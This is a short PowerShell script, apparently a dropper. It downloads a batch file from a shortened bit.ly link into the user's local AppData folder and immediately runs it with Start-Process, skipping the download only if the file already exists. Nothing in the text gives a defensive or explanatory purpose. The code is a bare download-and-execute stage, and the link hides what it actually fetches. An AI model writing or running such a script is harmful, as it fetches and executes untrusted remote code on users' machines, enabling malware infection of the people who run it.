$url = "https://bit.ly/fakebatman"
$output = "$env:localappdata\downloaded_file.bat"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -FilePath $output
}
